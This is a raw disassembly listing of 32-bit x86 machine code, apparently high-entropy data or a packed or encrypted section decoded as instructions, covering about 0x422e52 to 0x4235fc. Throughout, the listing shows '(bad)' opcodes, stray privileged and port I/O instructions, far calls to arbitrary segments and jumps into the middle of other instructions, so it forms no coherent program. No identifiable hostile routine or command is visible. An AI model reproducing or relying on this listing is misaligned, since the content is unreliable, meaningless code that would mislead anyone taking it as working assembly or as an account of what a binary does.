  422e52:	fcomp  DWORD PTR [esi]
  422e54:	inc    ebp
  422e55:	rcr    DWORD PTR [eax],1
  422e57:	rcl    DWORD PTR [eax-0x57],1
  422e5a:	imul   edi,ebp,0x67
  422e5d:	out    dx,eax
  422e5e:	sbb    cl,BYTE PTR ds:0xb398fc14
  422e64:	bnd jl 0x422e34
  422e67:	add    BYTE PTR [ebp+0x69],dl
  422e6a:	and    ecx,ecx
  422e6c:	mov    edx,ss
  422e6e:	add    eax,0x1a6f26b2
  422e73:	call   0x69b5:0x13acd2e8
  422e7a:	jo     0x422ec6
  422e7c:	popf   
  422e7d:	push   0x1c1f24d7
  422e82:	push   cs
  422e83:	scas   al,BYTE PTR es:[edi]
  422e84:	(bad)  
  422e85:	(bad)  
  422e86:	iret   
  422e87:	sub    dl,BYTE PTR [ebp+0x20000895]
  422e8d:	in     eax,dx
  422e8e:	mov    esi,0xa80f6d4e
  422e93:	xchg   ebx,eax
  422e94:	rcl    DWORD PTR [ecx],cl
  422e96:	ins    BYTE PTR es:[edi],dx
  422e97:	jmp    0x422ede
  422e99:	and    al,0x1b
  422e9b:	dec    ebx
  422e9c:	es sub al,0xe8
  422e9f:	jle    0x422edf
  422ea1:	xor    al,0x39
  422ea3:	test   BYTE PTR [ecx+eax*2+0x65],bl
  422ea7:	inc    eax
  422ea8:	dec    edx
  422ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422eaa:	xor    DWORD PTR [edx],edx
  422eac:	aas    
  422ead:	retf   
  422eae:	lock data16 stos BYTE PTR es:[edi],al
  422eb1:	dec    esp
  422eb2:	in     eax,0x7c
  422eb4:	icebp  
  422eb5:	jmp    0xf058:0xd9d76e4f
  422ebc:	lock call 0x7378:0x41dc4793
  422ec4:	dec    ecx
  422ec5:	inc    ecx
  422ec6:	sti    
  422ec7:	daa    
  422ec8:	adc    al,0xd8
  422eca:	in     eax,dx
  422ecb:	push   0x87f53805
  422ed0:	jmp    0x8e01:0xf5ffbc1
  422ed7:	int3   
  422ed8:	mov    bh,0xdf
  422eda:	mov    WORD PTR [ebp+0x50ef39b2],ds
  422ee0:	fnsave [esi]
  422ee2:	fidiv  DWORD PTR [edx]
  422ee4:	pushf  
  422ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ee6:	das    
  422ee7:	lock push es
  422ee9:	(bad)  
  422eea:	out    0xf4,eax
  422eec:	sbb    bl,0xa7
  422eef:	push   esi
  422ef0:	into   
  422ef1:	xor    ah,dh
  422ef3:	popa   
  422ef4:	mov    BYTE PTR [esp+edx*8+0x5d],ah
  422ef8:	cwde   
  422ef9:	jnp    0x422e7c
  422efb:	sub    dl,dl
  422efd:	popa   
  422efe:	dec    edx
  422eff:	cmp    al,0xd
  422f01:	and    bh,dl
  422f03:	dec    esi
  422f04:	in     al,dx
  422f05:	mov    WORD PTR [esi-0x45],cs
  422f08:	ret    
  422f09:	cmp    DWORD PTR [edi],ecx
  422f0b:	arpl   di,di
  422f0d:	mov    ebx,0x6732d0e
  422f12:	dec    edx
  422f13:	xchg   BYTE PTR [esi-0x20],dl
  422f16:	jbe    0x422f38
  422f18:	xor    BYTE PTR [esi+0x60cd69b3],0xe4
  422f1f:	pop    ebx
  422f20:	aad    0x96
  422f22:	gs inc ebx
  422f24:	dec    ebp
  422f25:	out    dx,al
  422f26:	adc    al,0xbe
  422f28:	retf   
  422f29:	cmp    BYTE PTR ds:0x5a3bf2b5,dl
  422f2f:	mov    ecx,DWORD PTR [eax+edi*1-0x227b3e54]
  422f36:	lods   al,BYTE PTR ds:[esi]
  422f37:	inc    esi
  422f38:	add    eax,0x18e323b1
  422f3d:	(bad)  
  422f3e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f40:	cs inc eax
  422f42:	das    
  422f43:	fld    DWORD PTR [eax]
	...
  422f51:	add    dh,BYTE PTR [ebx]
  422f53:	mov    edi,DWORD PTR [eax]
  422f55:	mov    ebx,0xb63bb3b8
  422f5a:	fsubp  st(3),st
  422f5c:	mov    bh,0xda
  422f5e:	adc    eax,0xa7c77d4b
  422f63:	add    DWORD PTR [eax],eax
  422f65:	stos   DWORD PTR es:[edi],eax
  422f66:	add    eax,DWORD PTR [eax]
  422f68:	add    ah,bh
  422f6a:	pop    DWORD PTR [edx+ecx*1+0x11]
  422f6e:	int3   
  422f6f:	mov    ch,0x4b
  422f71:	out    0x2a,al
  422f73:	push   edi
  422f74:	push   ds
  422f75:	cmc    
  422f76:	pop    esi
  422f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f78:	hlt    
  422f79:	and    edi,eax
  422f7b:	loopne 0x422fa5
  422f7d:	and    cl,cl
  422f7f:	pop    ecx
  422f80:	hlt    
  422f81:	dec    ebp
  422f82:	or     edx,DWORD PTR [edi+0x5f]
  422f85:	or     eax,0x4c149684
  422f8a:	leave  
  422f8b:	test   al,0x80
  422f8d:	icebp  
  422f8e:	rcl    BYTE PTR [esi-0x54],0x98
  422f92:	and    cl,al
  422f94:	sub    BYTE PTR [ebx+0x3c487116],0x8b
  422f9b:	and    DWORD PTR [ebp-0x20e406c6],0x9a531943
  422fa5:	les    ecx,FWORD PTR [ebx]
  422fa7:	mov    al,ds:0x643d19f7
  422fac:	mov    edi,0x23fc30e0
  422fb1:	call   0x4a6e6e74
  422fb6:	fild   QWORD PTR [edx+ebx*8]
  422fb9:	adc    BYTE PTR [edx+0x29701de1],0x45
  422fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fc1:	(bad)  
  422fc2:	or     eax,0xbbdfeef6
  422fc7:	xchg   eax,ebp
  422fc9:	xor    bl,BYTE PTR [eax-0x7aaf3ee7]
  422fcf:	test   eax,0x2f020575
  422fd4:	fsubr  DWORD PTR [ebp+0x19]
  422fd7:	cdq    
  422fd8:	cmc    
  422fd9:	and    al,0xc3
  422fdb:	jbe    0x423007
  422fdd:	mov    esi,fs
  422fdf:	push   0x74
  422fe1:	and    BYTE PTR [esi+ebp*8+0x63],dl
  422fe5:	mov    cl,0x1e
  422fe7:	jmp    0x625b:0x45e5ab76
  422fee:	fcmovbe st,st(6)
  422ff0:	xor    bh,BYTE PTR [edx+ecx*4-0x44]
  422ff4:	stc    
  422ff5:	ss lahf 
  422ff7:	ficomp DWORD PTR [ebp-0x40181a0c]
  422ffd:	inc    esp
  422ffe:	dec    ebp
  422fff:	stos   BYTE PTR es:[edi],al
  423000:	sub    eax,0x98bea59
  423005:	arpl   WORD PTR [ebx],sp
  423007:	inc    ecx
  423008:	fld    TBYTE PTR ds:0x136d068f
  42300e:	mov    dl,0xdd
  423010:	int3   
  423011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423012:	xchg   esp,eax
  423013:	rcl    dl,cl
  423015:	ins    BYTE PTR es:[edi],dx
  423016:	ins    DWORD PTR es:[edi],dx
  423017:	pop    ebp
  423018:	xchg   esp,eax
  423019:	icebp  
  42301a:	stos   BYTE PTR es:[edi],al
  42301b:	jbe    0x42308a
  42301d:	sbb    eax,0xcd4098c4
  423022:	mov    ch,0x12
  423024:	ds aam 0xb1
  423027:	sub    ebp,edx
  423029:	and    BYTE PTR [edi+edi*4],0x39
  42302d:	push   cs
  42302e:	push   es
  42302f:	jmp    0x42303a
  423031:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423033:	iret   
  423034:	int3   
  423035:	neg    ebp
  423037:	imul   edx,DWORD PTR [esi+0x53],0xffffffec
  42303b:	call   0x530f:0x5eb36ea1
  423042:	sub    ecx,0xffffff98
  423045:	xchg   BYTE PTR [eax],bh
  423047:	jnp    0x423039
  423049:	jge    0x42306e
  42304b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42304c:	xor    al,0xf3
  42304e:	arpl   WORD PTR fs:[esi*8+0x68b20537],ax
  423056:	loope  0x42304f
  423058:	inc    ecx
  423059:	jg     0x423073
  42305b:	lock and dl,BYTE PTR [ebx+0x6e903bd]
  423062:	sahf   
  423063:	jmp    0x423064
  423065:	(bad)  
  423066:	call   0x5adf:0x4a1bade6
  42306d:	call   0x3001:0x8ca8c8e2
  423074:	xlat   BYTE PTR ds:[ebx]
  423075:	aad    0xb0
  423077:	mov    edi,0xbbfff164
  42307c:	call   0x2dfc5748
  423081:	mov    ah,0x5
  423083:	xchg   esi,eax
  423084:	add    esi,DWORD PTR [ecx]
  423086:	mov    esp,0xa9b11ea2
  42308b:	sahf   
  42308c:	iret   
  42308d:	jbe    0x4230dd
  42308f:	cdq    
  423090:	pop    ebx
  423091:	popa   
  423092:	dec    esi
  423093:	add    DWORD PTR [edi+ecx*8-0x43],ebx
  423097:	enter  0xca32,0xb7
  42309b:	mov    al,ds:0x4925f56e
  4230a0:	push   eax
  4230a1:	jnp    0x423105
  4230a3:	outs   dx,BYTE PTR ds:[esi]
  4230a4:	mov    cs,WORD PTR [esi+0x19a80d96]
  4230aa:	push   ebx
  4230ab:	push   esi
  4230ac:	ins    DWORD PTR es:[edi],dx
  4230ad:	adc    al,0x6a
  4230af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230b0:	cmp    DWORD PTR [eax],esi
  4230b2:	sbb    ebx,DWORD PTR [edi]
  4230b4:	je     0x42312e
  4230b6:	retf   0x6e94
  4230b9:	test   al,0xc5
  4230bb:	sub    al,0xdd
  4230bd:	cmp    bh,al
  4230bf:	(bad)
  4230c3:	jge    0x423080
  4230c5:	gs adc al,0xe5
  4230c8:	call   0x2d85229a
  4230cd:	int    0x69
  4230cf:	ds push esi
  4230d1:	lods   eax,DWORD PTR ds:[esi]
  4230d2:	mov    bh,0xa3
  4230d4:	std    
  4230d5:	push   ecx
  4230d6:	sub    al,0x42
  4230d8:	or     DWORD PTR [ebx-0x64],ebx
  4230db:	sar    esp,cl
  4230dd:	shl    BYTE PTR [eax+0x10caf425],1
  4230e3:	and    eax,0xfdf987c2
  4230e8:	in     al,0x46
  4230ea:	xor    DWORD PTR [ecx],ebp
  4230ec:	dec    esp
  4230ed:	adc    DWORD PTR [ecx],edi
  4230ef:	and    DWORD PTR [ebp+0x187a9400],0xffffffb0
  4230f6:	or     esp,edx
  4230f8:	xor    DWORD PTR [esp+eax*8],esp
  4230fb:	mov    eax,ds:0x3c93c396
  423100:	addr16 clc 
  423102:	and    DWORD PTR [ecx-0x42],esi
  423105:	adc    eax,0xe5bc97fd
  42310a:	push   DWORD PTR [esi-0x34]
  42310d:	mov    dh,BYTE PTR [edx]
  42310f:	int    0x36
  423111:	cmp    eax,0xee04e3e5
  423116:	mov    ch,0x33
  423118:	push   0xe6ed9f76
  42311d:	push   ecx
  42311e:	test   DWORD PTR [ecx],edx
  423120:	mov    ah,0xea
  423122:	mov    ah,0xbe
  423124:	or     BYTE PTR [ecx],ch
  423126:	out    dx,al
  423127:	push   ecx
  423128:	and    al,bl
  42312a:	push   0xe4d8ae26
  42312f:	in     al,0x4a
  423131:	shl    BYTE PTR ds:0xa173e36a,1
  423137:	xchg   BYTE PTR ds:0xbf7f113,bh
  42313d:	int    0x49
  42313f:	mov    ah,0xe0
  423141:	push   ss
  423142:	jns    0x423185
  423144:	ss mov ebp,0x1c8c4697
  42314a:	imul   edx,DWORD PTR [edi+0x61],0x70bd84c3
  423151:	dec    esp
  423152:	cli    
  423153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423155:	jns    0x42314c
  423157:	sar    DWORD PTR [ecx+0x56daf114],0xba
  42315e:	push   eax
  42315f:	daa    
  423160:	fld    QWORD PTR [ecx+eax*4+0x1b]
  423164:	retf   0xa608
  423167:	jne    0x4231ac
  423169:	enter  0x7bcb,0x9a
  42316d:	fdivr  QWORD PTR [eax+0x18fbdabf]
  423173:	clc    
  423174:	sahf   
  423175:	adc    BYTE PTR [ebp+0x7d],dl
  423178:	into   
  423179:	ss jg  0x4231bd
  42317c:	cmp    al,0x15
  42317e:	jmp    0x916f:0xb3d2ce93
  423185:	cmc    
  423186:	(bad)  [eax+0x606d2d2b]
  42318c:	js     0x4231e7
  42318e:	xchg   ebx,eax
  42318f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423190:	mov    ebp,0xbc25e61f
  423195:	(bad)  
  423196:	in     eax,dx
  423197:	ret    
  423198:	mov    DWORD PTR [edi],eax
  42319a:	push   esi
  42319b:	xchg   BYTE PTR [edx+0x22],bl
  42319e:	ins    BYTE PTR es:[edi],dx
  42319f:	gs jns 0x423190
  4231a2:	cmp    DWORD PTR [ecx-0x2c],edx
  4231a5:	mov    esp,0xa241df1f
  4231aa:	xchg   ecx,eax
  4231ab:	dec    edi
  4231ac:	xor    cl,dh
  4231ae:	shr    BYTE PTR [ebp-0x17264c61],1
  4231b4:	hlt    
  4231b5:	scas   eax,DWORD PTR es:[edi]
  4231b6:	iret   
  4231b7:	add    al,0xa8
  4231b9:	fstp   QWORD PTR [edi-0x37]
  4231bc:	jne    0x423161
  4231be:	dec    edi
  4231bf:	mov    ebp,DWORD PTR [ecx+eax*8-0x1f]
  4231c3:	fcom   QWORD PTR [ebx+ebx*2]
  4231c6:	repnz xchg esp,eax
  4231c8:	push   esi
  4231c9:	inc    ebp
  4231ca:	push   0x3e
  4231cc:	popf   
  4231cd:	int3   
  4231ce:	jl     0x42323e
  4231d0:	dec    edi
  4231d1:	dec    edx
  4231d2:	and    DWORD PTR gs:[edi],ebp
  4231d5:	imul   DWORD PTR [eax]
  4231d7:	inc    edx
  4231d8:	mov    dh,BYTE PTR [edi+0x4673d8b9]
  4231de:	icebp  
  4231df:	(bad)  [ecx]
  4231e1:	dec    ebp
  4231e2:	push   edx
  4231e3:	jb     0x423235
  4231e5:	jae    0x423250
  4231e7:	pusha  
  4231e8:	xor    ch,cl
  4231ea:	mov    BYTE PTR [esi],bl
  4231ec:	push   cs
  4231ed:	mov    esp,0x2754cc45
  4231f2:	xchg   al,bh
  4231f4:	mov    eax,0x4c07a8d9
  4231f9:	sub    ebx,0x682a0fbc
  4231ff:	pop    es
  423200:	pushf  
  423201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423202:	mov    bl,BYTE PTR [edi]
  423204:	jg     0x42322f
  423206:	push   0x1d0dbed2
  42320b:	std    
  42320c:	call   FWORD PTR [eax-0x4f]
  42320f:	mov    WORD PTR [edi],?
  423211:	fistp  DWORD PTR [ecx]
  423213:	push   ds
  423214:	aad    0x17
  423216:	in     al,0x30
  423218:	sbb    ebx,DWORD PTR [edi+0x5b3da63b]
  42321e:	jo     0x4231cd
  423220:	xchg   edi,eax
  423221:	test   BYTE PTR [ecx-0x74],bh
  423224:	jg     0x423262
  423226:	add    esi,0xffffffd4
  423229:	ficom  DWORD PTR [esi]
  42322b:	stos   DWORD PTR es:[edi],eax
  42322c:	test   BYTE PTR [esi+edx*1],bh
  42322f:	stos   DWORD PTR es:[edi],eax
  423230:	stos   BYTE PTR es:[edi],al
  423231:	mov    eax,0xea4766cc
  423236:	jmp    0x751c:0x179b8047
  42323d:	in     al,dx
  42323e:	les    esp,FWORD PTR [edi-0x46]
  423241:	mov    ds:0x52a8432d,eax
  423246:	jl     0x4232b4
  423248:	das    
  423249:	div    BYTE PTR [ebp+ebp*4-0x38]
  42324d:	mov    eax,0x7651c4f0
  423252:	gs (bad) 
  423255:	jae    0x423244
  423257:	and    DWORD PTR [esi],esi
  423259:	sbb    ch,BYTE PTR [esi+0x41]
  42325c:	and    al,0x8
  42325e:	cdq    
  42325f:	xor    eax,0x2eee039f
  423264:	mov    dh,0x0
  423266:	pop    esi
  423267:	xchg   edx,eax
  423268:	das    
  423269:	xchg   edi,eax
  42326a:	int3   
  42326b:	and    BYTE PTR [edx*8+0x23c71b7d],ah
  423272:	cwde   
  423273:	shl    DWORD PTR [edi+0x5b],cl
  423276:	mov    BYTE PTR [ebx+ebx*8-0x1aec3ed9],bl
  42327d:	mov    dh,0x43
  42327f:	add    bl,cl
  423281:	pop    edi
  423282:	mov    eax,ds:0xc9f9b3bf
  423287:	ins    BYTE PTR es:[edi],dx
  423288:	cs jns 0x423212
  42328b:	mov    bl,0x57
  42328d:	add    bh,BYTE PTR [esi]
  42328f:	or     eax,0x94dc3d88
  423294:	in     eax,0xa7
  423296:	pop    esp
  423297:	push   edx
  423298:	test   DWORD PTR [ecx],ebx
  42329a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42329b:	jmp    0x4232f0
  42329d:	mov    DWORD PTR [ebp+0x67bb3d67],esi
  4232a3:	mov    bl,bh
  4232a5:	test   BYTE PTR [edi-0x18],ah
  4232a8:	ss in  eax,dx
  4232aa:	pop    edx
  4232ab:	rcr    esp,0x37
  4232ae:	sbb    al,0x73
  4232b0:	inc    ebp
  4232b1:	mov    edx,0x1819d0e7
  4232b6:	pop    es
  4232b7:	sbb    edi,0x333232a0
  4232bd:	jge    0x4232bd
  4232bf:	outs   dx,DWORD PTR ds:[esi]
  4232c0:	push   eax
  4232c1:	shl    ch,cl
  4232c3:	mov    esi,0xb6d102f2
  4232c8:	inc    ebp
  4232c9:	scas   eax,DWORD PTR es:[edi]
  4232ca:	push   0xe4de4b12
  4232cf:	and    DWORD PTR [ebx],ecx
  4232d1:	les    ebx,FWORD PTR [esi+0x75]
  4232d4:	pop    ebx
  4232d5:	mov    ah,0x1c
  4232d7:	pusha  
  4232d8:	dec    ebp
  4232d9:	push   ss
  4232da:	dec    ecx
  4232db:	ins    BYTE PTR es:[edi],dx
  4232dc:	xlat   BYTE PTR ds:[ebx]
  4232dd:	adc    ecx,DWORD PTR [ecx+ecx*4]
  4232e0:	mov    cl,0x9f
  4232e2:	pop    edi
  4232e3:	dec    ecx
  4232e4:	mov    bh,0x23
  4232e6:	ret    
  4232e7:	dec    ebx
  4232e8:	rcl    BYTE PTR [esi],0xae
  4232eb:	xchg   ebp,eax
  4232ec:	lock imul ecx,DWORD PTR [eax+0x73],0xbb729287
  4232f4:	dec    esi
  4232f5:	jnp    0x423283
  4232f7:	ret    
  4232f8:	xchg   edx,eax
  4232fa:	sbb    ebp,DWORD PTR [esi-0x2c]
  4232fd:	mov    eax,ds:0xb73fc2e4
  423302:	int    0x36
  423304:	jns    0x423286
  423306:	pop    edi
  423307:	out    0x69,eax
  423309:	and    al,0x24
  42330b:	cmp    DWORD PTR [eax+edi*4-0x34],ebx
  42330f:	fmul   st(5),st
  423311:	pop    ecx
  423312:	test   BYTE PTR [ebp+0x0],dl
	...
  423320:	add    dl,bh
  423322:	dec    esp
  423323:	push   es
  423324:	ret    
  423325:	mov    dh,0xcb
  423327:	(bad)  
  423328:	jge    0x423393
  42332a:	cmp    ah,BYTE PTR [edi]
  42332c:	in     al,0xd2
  42332e:	sbb    BYTE PTR [edx-0xd],0x72
  423332:	stos   DWORD PTR es:[edi],eax
  423333:	add    DWORD PTR [eax],eax
  423335:	stos   DWORD PTR es:[edi],eax
  423336:	add    eax,DWORD PTR [eax]
  423338:	add    BYTE PTR [ebp+0x1e],ah
  42333b:	add    BYTE PTR [edi+0x4e5df104],bh
  423341:	and    eax,0xec085acc
  423346:	jnp    0x4232cc
  423348:	icebp  
  423349:	or     BYTE PTR [esi],ah
  42334b:	add    edi,edx
  42334d:	out    0x97,al
  42334f:	ret    
  423350:	or     ch,ch
  423352:	fdivr  DWORD PTR [edi]
  423354:	mov    BYTE PTR [edi+esi*2],bh
  423357:	aas    
  423358:	xchg   esp,eax
  423359:	(bad)  
  42335a:	jecxz  0x4233cf
  42335c:	pop    ss
  42335d:	popa   
  42335e:	std    
  42335f:	es inc ebx
  423361:	dec    ebx
  423362:	mov    dh,0x94
  423364:	jmp    0xac840b8f
  423369:	and    BYTE PTR [edx+0x7c],bl
  42336c:	arpl   WORD PTR [edx-0x6de5b337],ax
  423372:	add    ah,BYTE PTR [ecx-0x41]
  423375:	aaa    
  423376:	int    0x53
  423378:	dec    edi
  423379:	sub    dh,BYTE PTR [eax-0x43f7f8a5]
  42337f:	jl     0x4233ec
  423381:	scas   al,BYTE PTR es:[edi]
  423382:	iret   
  423383:	fidivr DWORD PTR [eax-0x3a]
  423386:	js     0x4233d2
  423388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42338a:	sbb    ebx,ecx
  42338c:	out    dx,al
  42338d:	hlt    
  42338e:	sbb    BYTE PTR [edi],cl
  423390:	push   ecx
  423391:	xlat   BYTE PTR ds:[ebx]
  423392:	das    
  423393:	or     eax,esi
  423395:	int    0x3c
  423397:	sbb    DWORD PTR [ebx+0x709c46b7],esp
  42339d:	sub    al,0x20
  42339f:	push   edx
  4233a0:	mov    ebx,0x91246a5c
  4233a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233a6:	sbb    eax,0x5aa14d1c
  4233ab:	pop    ecx
  4233ac:	das    
  4233ad:	adc    ebx,edi
  4233af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233b0:	inc    ebx
  4233b1:	(bad)  
  4233b2:	in     al,dx
  4233b3:	xchg   ebp,ebx
  4233b5:	mov    DWORD PTR [ebx+ebx*4],edx
  4233b8:	in     eax,dx
  4233b9:	mov    bl,0x53
  4233bb:	ins    DWORD PTR es:[edi],dx
  4233bc:	pusha  
  4233bd:	(bad)  
  4233be:	dec    esp
  4233bf:	add    BYTE PTR [esi],cl
  4233c1:	cmp    eax,0x59215c1c
  4233c6:	sub    eax,0x66231655
  4233cb:	nop
  4233cc:	mov    dl,0xcf
  4233ce:	mov    dl,0x30
  4233d0:	call   0x4eba:0x1b93974f
  4233d7:	dec    edx
  4233d8:	xchg   ebp,eax
  4233d9:	inc    ebp
  4233da:	push   ss
  4233db:	cmp    al,ch
  4233dd:	jo     0x423428
  4233df:	sti    
  4233e0:	adc    al,0xac
  4233e2:	sbb    DWORD PTR [esi+0x6acf441b],esi
  4233e8:	adc    al,0x99
  4233ea:	aam    0xac
  4233ec:	ss jmp 0xce27aeb8
  4233f2:	push   0x703a4850
  4233f7:	cdq    
  4233f8:	shl    edi,cl
  4233fa:	lock aad 0x2b
  4233fd:	ret    
  4233fe:	pusha  
  4233ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423400:	mov    ah,0xad
  423402:	and    BYTE PTR [edi],0x36
  423405:	and    eax,0xaf798f1d
  42340a:	cwde   
  42340b:	test   ebp,ebx
  42340d:	int    0xf4
  42340f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423410:	mov    ds:0xe1076c01,eax
  423415:	mov    bh,0x88
  423417:	ja     0x423435
  423419:	jne    0x42339f
  42341b:	cli    
  42341c:	or     dl,BYTE PTR [ebx]
  42341e:	xor    edi,DWORD PTR [ebx-0x30ef0ddd]
  423424:	sub    BYTE PTR [eax-0x1b],dh
  423427:	mov    ds:0xbd40fdab,al
  42342c:	lds    ecx,FWORD PTR [eax]
  42342e:	add    edi,eax
  423430:	sub    al,0x26
  423432:	aas    
  423433:	(bad)  
  423434:	sbb    eax,eax
  423436:	pop    ebp
  423437:	mov    esp,DWORD PTR [ebx+0x23]
  42343a:	rol    DWORD PTR [eax+edi*8+0x34930b6],1
  423441:	ja     0x42346a
  423443:	std    
  423444:	imul   esp,DWORD PTR [ecx-0x468cb994]
  42344b:	jo     0x4233fd
  42344d:	inc    esp
  42344e:	inc    esp
  42344f:	mov    ecx,DWORD PTR [edi+ebp*4]
  423452:	jae    0x42343e
  423454:	enter  0x8ae6,0xc
  423458:	lea    ebx,[edx+0x14]
  42345b:	inc    ecx
  42345c:	aaa    
  42345d:	gs jno 0x423441
  423460:	mov    cl,BYTE PTR [bx-0x35]
  423464:	scas   eax,DWORD PTR es:[edi]
  423465:	test   eax,0x9ee05df5
  42346a:	mov    ecx,0x35e9fa1c
  42346f:	adc    esi,DWORD PTR [eax*8-0x6cbea512]
  423476:	loope  0x423433
  423478:	push   eax
  423479:	inc    ecx
  42347a:	repz xchg ebp,eax
  42347c:	imul   ecx,DWORD PTR [edx+edi*8+0x4f10c206],0x46
  423484:	inc    eax
  423485:	mov    ds:0x4bf13b53,al
  42348a:	adc    eax,esp
  42348c:	dec    esp
  42348d:	leave  
  42348e:	mov    ds:0xbdb837d4,eax
  423493:	mov    bh,BYTE PTR [esi+0x70]
  423496:	mov    esi,0xf360ee98
  42349b:	dec    eax
  42349c:	mov    ebp,0x232cf9e4
  4234a1:	cmp    esp,DWORD PTR [ebx+0x73d671ee]
  4234a7:	shl    BYTE PTR [edx],0xa
  4234aa:	loopne 0x4234be
  4234ac:	addr16 mov ds:0x7639,eax
  4234b0:	cdq    
  4234b1:	mov    esi,0xff7a6bbc
  4234b6:	(bad)  
  4234b7:	stc    
  4234b8:	xor    eax,0x42a3ccec
  4234bd:	ins    BYTE PTR es:[edi],dx
  4234be:	ret    
  4234bf:	call   0x9de6b454
  4234c4:	xor    eax,0x316b920
  4234c9:	in     al,0x66
  4234cb:	sbb    DWORD PTR [edx-0x34],ecx
  4234ce:	dec    edx
  4234cf:	int3   
  4234d0:	mov    ?,WORD PTR [ecx]
  4234d2:	inc    ebx
  4234d3:	jnp    0x4234c4
  4234d5:	add    al,BYTE PTR [esi]
  4234d7:	iret   
  4234d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234d9:	icebp  
  4234da:	sub    ebx,DWORD PTR [eax-0x1dab02e]
  4234e0:	jb     0x4234df
  4234e2:	pop    ss
  4234e3:	push   ebp
  4234e4:	or     esi,DWORD PTR [eax-0x62]
  4234e7:	jo     0x42353c
  4234e9:	iret   
  4234ea:	sbb    eax,0x22ccb53
  4234ef:	adc    BYTE PTR [ebx],bh
  4234f1:	into   
  4234f2:	cmc    
  4234f3:	cmp    edi,DWORD PTR [esi+0x7]
  4234f6:	push   ecx
  4234f7:	push   ebp
  4234f8:	out    0x2,eax
  4234fa:	sub    edx,ebp
  4234fc:	outs   dx,BYTE PTR ds:[esi]
  4234fd:	gs mov esp,0x226a996b
  423503:	xor    al,0xa6
  423505:	ins    DWORD PTR es:[edi],dx
  423506:	lods   al,BYTE PTR ds:[si]
  423508:	fistp  DWORD PTR [edi]
  42350a:	sbb    BYTE PTR [ebp+0x68],al
  42350d:	jno    0x423572
  42350f:	fldenv [eax-0x31]
  423512:	repz daa 
  423514:	sub    eax,0xdb3200af
  423519:	sbb    DWORD PTR [ebx],ebp
  42351b:	popa   
  42351c:	mov    dh,0x41
  42351e:	dec    esp
  42351f:	xchg   ebp,eax
  423520:	sbb    al,0xfc
  423522:	jae    0x42356a
  423524:	pop    edx
  423525:	mov    al,ds:0x31cfc7
  42352a:	sbb    DWORD PTR [edi+ecx*8],ebp
  42352d:	stos   BYTE PTR es:[edi],al
  42352e:	es adc eax,ecx
  423531:	jl     0x423507
  423533:	enter  0xa7d9,0x14
  423537:	daa    
  423538:	mov    eax,0x1fb4882c
  42353d:	or     ah,BYTE PTR [ebp-0x1]
  423540:	mov    ah,0x26
  423542:	jmp    0xa8eb:0x54c369ec
  423549:	lods   al,BYTE PTR ds:[esi]
  42354a:	in     eax,dx
  42354b:	retf   0xada0
  42354e:	push   esp
  42354f:	xchg   esp,eax
  423550:	dec    esi
  423551:	or     BYTE PTR [edx-0x477d7402],0x75
  423558:	inc    ebp
  423559:	imul   ebp,DWORD PTR [eax-0xad4b87a],0x7dd3f90
  423563:	push   cs
  423564:	out    0x61,al
  423566:	ficom  DWORD PTR cs:[edi]
  423569:	cwde   
  42356a:	mov    ch,BYTE PTR [edi-0xe]
  42356d:	sahf   
  42356e:	mov    bh,0xed
  423570:	and    ebx,DWORD PTR [ebx]
  423572:	inc    edi
  423573:	cmc    
  423574:	cmp    BYTE PTR [ecx],0xff
  423577:	daa    
  423578:	ret    0x3b0a
  42357b:	aam    0x91
  42357d:	stos   BYTE PTR es:[edi],al
  42357e:	clc    
  42357f:	cmp    BYTE PTR [esi-0x54e01299],cl
  423585:	popf   
  423586:	mov    eax,0x54f651d2
  42358b:	push   edx
  42358c:	lock jnp 0x423586
  42358f:	push   0xe1628d3e
  423594:	push   eax
  423595:	aad    0xe6
  423597:	lahf   
  423598:	sub    DWORD PTR [ebx-0x7c861bd1],0x4976d973
  4235a2:	out    dx,eax
  4235a3:	sbb    edx,DWORD PTR [edi]
  4235a5:	sub    esi,edi
  4235a7:	mov    bh,0x9c
  4235a9:	sub    BYTE PTR [edx],bh
  4235ab:	les    esi,FWORD PTR [edx+0x2e63291b]
  4235b1:	not    DWORD PTR [ebx+0x4b]
  4235b4:	mov    dl,0x9b
  4235b6:	sub    BYTE PTR [eax+0x246ddc8c],0x32
  4235bd:	scas   eax,DWORD PTR es:[edi]
  4235be:	xor    DWORD PTR [ecx-0x4c],ebx
  4235c1:	cmp    al,0x56
  4235c3:	jbe    0x42362f
  4235c5:	out    0x2f,al
  4235c7:	loop   0x4235f4
  4235c9:	es xchg edi,eax
  4235cb:	push   0xea631553
  4235d0:	sbb    al,0xdb
  4235d2:	mov    al,ds:0x959ffa09
  4235d7:	sub    ch,bh
  4235d9:	jg     0x423570
  4235db:	imul   edi,esi,0x70
  4235de:	pop    esp
  4235df:	jne    0x42356f
  4235e1:	add    DWORD PTR [esi+0x3d83e01b],ecx
  4235e7:	push   0xfffffffc
  4235e9:	test   al,0x7a
  4235eb:	mov    eax,0xd6ada8ad
  4235f0:	xlat   BYTE PTR ds:[ebx]
  4235f1:	inc    ebp
  4235f2:	sub    al,0x2b
  4235f4:	adc    al,0x51
  4235f6:	sub    DWORD PTR [ecx],0x9
  4235f9:	dec    edx
  4235fa:	mov    ah,0x2b
  4235fc:	call   0xaf098ea4
